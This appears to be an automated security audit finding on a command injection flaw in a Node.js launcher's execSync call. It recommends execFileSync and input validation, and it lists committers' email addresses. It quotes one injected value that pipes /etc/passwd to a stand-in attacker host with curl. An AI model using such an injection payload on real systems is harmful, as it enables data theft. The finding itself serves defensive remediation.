# [MEDIUM] Command injection via unescaped env-controlled values in execSync

**File:** [`src/headroom/launcher.js`](https://github.com/Fast-Editor/Lynkr/blob/feat/parallel-tool-execution/blob/feat/src/headroom/launcher.js#L175-L190) (lines 175, 190)
**Project:** claude-code
**Severity:** MEDIUM  •  **Confidence:** high  •  **Slug:** `rce`

## Owners

**Suggested assignee:** `vishalveera.reddy@servicenow.com` _(via last-committer)_

## Finding

Line 190 interpolates `imageName` and `contextPath` directly into a shell command string passed to execSync. `imageName` is sourced from `process.env.HEADROOM_DOCKER_IMAGE` (config/index.js:233) and `contextPath` is `path.resolve(process.cwd(), process.env.HEADROOM_DOCKER_BUILD_CONTEXT)`. Neither is sanitized or shell-escaped. If `HEADROOM_DOCKER_IMAGE` is poisoned with a value like `evil:tag; curl attacker.com/$(cat /etc/passwd|base64); #` the shell will execute the injected command. While these values are normally admin-controlled environment variables, defense-in-depth requires that any value being passed to a shell context be either escaped or the command be invoked with execFile / spawn (no shell). path.resolve does not strip metacharacters like `;`, `|`, `&`, backticks, `$()`, so even buildContext can be malicious if a directory containing those characters happens to exist. Triggered when `HEADROOM_DOCKER_AUTO_BUILD=true` and the image does not yet exist.

## Recommendation

Use `execFileSync('docker', ['build', '-t', imageName, contextPath], { stdio: 'inherit' })` instead of `execSync` with a string. This passes args as an argv list and avoids any shell parsing. Additionally, validate `imageName` against a Docker reference regex (e.g., `/^[a-z0-9._/-]+(:[a-zA-Z0-9._-]+)?$/`) before use, and confirm contextPath is inside an allowlisted root.

## Recent committers (`git log`)

- vishal veerareddy <vishalveera.reddy@servicenow.com> (2026-02-11)
- Vishal Veera Reddy <veerareddyvishal56@gmail.com> (2026-01-30)
